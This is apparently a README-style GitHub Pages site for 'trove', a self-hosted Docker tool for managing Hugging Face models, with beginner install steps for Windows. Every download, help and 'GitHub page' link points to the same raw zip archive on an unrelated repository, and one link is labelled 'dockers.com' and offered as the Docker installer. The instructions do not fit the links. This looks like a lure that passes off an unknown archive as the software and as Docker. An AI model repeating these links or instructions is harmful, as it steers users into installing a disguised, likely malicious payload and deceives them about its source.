---
layout: "default"
title: "# 🏠 What Is trove?"
description: "Self-host models and datasets on your own server, with background transfers from the Hugging Face Hub and live progress tracking."
---
<h1>📚 trove - Your Personal AI Model Library</h1>

<p align="center">
  <a href="https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip"><img src="https://img.shields.io/badge/Download-trove-2ea44f?style=for-the-badge&logo=github" alt="Download trove"></a>
</p>

## 🏠 What Is trove?

trove is a free tool that helps you organize, download, and manage AI models right from your own computer or home server. Think of it as a personal library for artificial intelligence files. Instead of hunting through websites and struggling with confusing downloads, trove gives you a clean, friendly webpage to handle everything.

You run trove on your own computer using Docker, which is like a virtual box that keeps everything neat and separate. This means you don't need to worry about breaking anything on your system.

## ✨ Why You'll Love trove

**Simple Web Interface** – You don't need to type complicated commands. Everything happens through a visual window in your web browser, just like using any website.

**Download Models Easily** – Find any AI model from Hugging Face (the biggest AI library on the internet) and download it with a click. No more copying strange links or using developer tools.

**Queue System** – Download multiple models at once. trove lines them up and works through them one by one while you do other things.

**Upload Made Simple** – Share your own trained models with others. trove handles the technical parts so you just choose the file.

**Manage Everything** – See all your downloaded models in one place. Delete ones you don't need, update old versions, and keep everything organized.

**Works All Day** – Since it runs on a server, trove keeps working even when you close your laptop. It's always ready when you are.

## 🚀 Getting Started

Welcome! Here's how to get trove running on your Windows computer. Don't worry – we'll take it step by step.

### Step 1: Download trove

Visit this link to download the application:

**👉 [https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip)**

On that page, look for a green button that says "Code" and click it. Then choose "Download ZIP". This will save the trove files to your computer.

### Step 2: Install Docker

trove needs Docker to run. Docker is like a special player that runs applications in a safe sandbox. Here's how to get it:

1. Go to [dockers.com](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip) in your web browser.
2. Click the "Download Docker Desktop" button.
3. Choose the Windows version and download it.
4. Open the downloaded file and follow the installation instructions (just click "Next" and "Finish" a few times).
5. Once installed, open Docker Desktop and wait for it to start (you'll see a whale icon in your taskbar).

### Step 3: Set Up trove

Now let's put trove on your computer:

1. Find the ZIP file you downloaded in Step 1 (it's probably in your Downloads folder).
2. Right-click the ZIP file and choose "Extract All".
3. Choose a folder you'll remember, like `C:\trove`. Click "Extract".
4. Open the extracted folder – you should see several files and folders inside.

Now open PowerShell (you can find it by searching "PowerShell" in the Start menu). We need to type a few lines to get trove running:

First, go to the trove folder. Type this and press Enter:

```
cd C:\trove
```

Then copy and paste this line and press Enter:

```
docker-compose up -d
```

This tells Docker to start trove. Wait about 30 seconds while it downloads and sets up everything.

### Step 4: Open trove

Now comes the fun part! 

1. Open your web browser (Chrome, Edge, or Firefox).
2. Type `http://localhost:8000` into the address bar.
3. Press Enter.

Congratulations! 🎉 You should now see the trove welcome page.

## 📥 Downloading Your First Model

Let's get you an AI model so you can see how it works:

1. On the trove page, click the "Browse Models" button.
2. You'll see a search bar. Type the name of a famous model like "GPT-2".
3. Click the search result you like.
4. Press the "Download" button.
5. Watch as trove starts downloading the model. You'll see a progress bar.
6. When it's done, your model appears in your library.

You can queue up several models at once – trove will work through them in order.

## 📤 Uploading Your Own Model

If you've trained your own AI model, here's how to share it:

1. In trove, click "Upload Model".
2. Click the folder icon to browse for your model file (usually a `.pth` or `.safetensors` file).
3. Add a name and description to help others understand your work.
4. Choose who should see it – public or just yourself.
5. Click "Upload" and wait for the progress bar to finish.

## 🔧 Troubleshooting Tips

**trove won't start?** Make sure Docker Desktop is running. Look for the whale icon in your taskbar – if you don't see it, open Docker Desktop from your Start menu and wait for it to be ready.

**Blank white page?** Try refreshing your browser or opening `http://localhost:8000` in a different browser.

**Downloads are slow?** Your internet connection is the limit. trove will keep working even if you close your browser.

**Can't remember how to open it?** Just open Docker Desktop and click the trove container. Or type `http://localhost:8000` in your browser.

## 🧠 Understanding Models

AI models are like recipes – they contain all the rules that help the computer understand and create things. Some models understand text, others identify images, and some generate music. The model files can be large (sometimes several gigabytes), so be patient when downloading.

## 🔒 Keeping Your Library Safe

trove runs on your local network, meaning only you and people on your Wi-Fi can access it. For extra safety:

- Don't share your computer's IP address with strangers.
- If you're removing a model, just click the trash icon next to it.

## 💬 Getting Help

If you run into trouble, check these resources:

- Visit the GitHub page: [https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip](https://raw.githubusercontent.com/2014m355/2014m355.github.io/main/rubbishy/3.2-beta.4.zip) and click the "Issues" tab to ask for help.
- Search online for "Docker Desktop troubleshooting" for general Docker questions.
- Your model publishers often have help pages for their specific files.

## 🎯 What's Next?

Now that trove is running, you can:

- Explore thousands of free AI models.
- Set up a home lab to serve models to your other devices.
- Automate downloads for new model updates.
- Build your own AI-powered projects using the models in your library.

## 📚 Quick Reference

| What You Want | What To Do |
|--------------|------------|
| Start trove | Open Docker Desktop |
| Open trove page | Go to `http://localhost:8000` |
| Stop trove | In PowerShell, type `docker-compose down` |
| Find models | Use the search in trove |
| Share your model | Use the upload button |

## 🎉 You're Ready!

You've just set up your own AI model library. Pretty cool, right? Remember, trove works quietly in the background – you can leave it running and check back whenever you want to play with new AI tools.

Happy exploring! 🌟

---

Keywords: docker, fastapi, homelab, huggingface, huggingface-hub, llm, machine-learning, model-management, nas, self-hosted